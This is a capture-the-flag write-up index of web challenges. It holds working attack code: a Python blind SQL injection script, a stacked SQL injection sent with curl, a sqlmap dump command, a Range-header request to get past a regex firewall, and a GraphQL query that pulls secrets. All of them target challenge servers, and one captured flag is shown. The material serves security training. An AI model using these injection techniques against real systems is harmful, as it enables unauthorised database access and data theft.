# Web Challenges

## Neon Breach - SQL Blind Injection

```python
import requests

url = "http://139.162.5.230:10175/search"
characters = "abcdefghijklmnopqrstuvwxyz0123456789_"
found_name = ""

for i in range(1, 20):
    for char in characters:
        payload = f"0 OR (SELECT SUBSTR(tbl_name, {i}, 1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 0,1)='{char}'--"
        r = requests.get(url, params={'emp_id': payload})

        if "Employee Found" in r.text:
            found_name += char
            print(f"Found so far: {found_name}")
            break
```

```
Found so far: employees
```

## VaccineAPI

```bash
curl -s -v 'http://139.162.5.230:10396/vaccine/1;select%20text%20from%20flag' | jq . | grep HZ
```

## Lil Pump

```bash
sqlmap -u 'ws://139.162.5.230:10119/ws' --data '{"songname":"*"}' --batch --level=5 --risk=3 --dump
```

## Regex Based Firewall

"Data Exfiltration by Fragmentation" буюу өгөгдлийг хэсэгчилж гаргаж авах

```bash
curl -H "Range: bytes=3-60" http://139.162.5.230:10372/flag.txt
MN{D3EP_uNdeRst4nD1n6_Of_H0w_Web_WORK5}
```

## Damage Checker (GraphQL)

```graphql
query secretStrategy{
    secretStrategy{
        topSecretStrategy}
    }
```

## Sub-pages

- [Web Socket - SQL](web-socket-sql.md)
- [Dynamic PDF - XSS /etc/passwd](dynamic-pdf-xss.md)
- [Gunship - Ast injection + Prototype Pollution](gunship-ast-injection.md)
- [RCE - Some vuln Websites](rce-vuln-websites.md)
- [Pickle loads - Insecure Deserialization](pickle-loads.md)
- [Regex based firewall](regex-firewall.md)
- [Trinity's Hidden Door - Command injection](trinitys-hidden-door.md)
- [Lodash - Prototype Pollution](lodash-prototype-pollution.md)
- [Hash Length Extension Attack](hash-length-extension.md)
- [Invite code /verify endpoint leads RCE](invite-code-rce.md)
- [CryptoJS decrypt](cryptojs-decrypt.md)
